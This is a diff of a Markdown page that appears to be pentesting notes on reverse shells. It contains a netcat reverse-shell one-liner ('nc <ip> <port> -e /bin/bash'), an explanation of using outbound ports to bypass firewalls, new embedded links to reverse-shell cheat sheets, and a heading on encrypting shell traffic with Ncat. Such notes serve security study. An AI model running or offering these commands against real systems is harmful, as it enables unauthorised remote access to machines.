@@ -58,7 +58,11 @@ nc <ip> <port> -e /bin/bash
 
 The idea of the `reverse shell` is to bypass the firewall, once we have discovered an outgoing port on the target network, we can take advantage of this by making the target machine connect to ours, thus sending a shell. We can also generate through these sites.
 
-## Ncat
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
+
+{% embed url="https://www.revshells.com/" %}
+
+### Ncat
 
 Ncat is an evolution of netcat, the difference is that it supports encryption and therefore it is not possible to clearly read what is transmitted during communication. We then need to generate a certificate and a key.
 
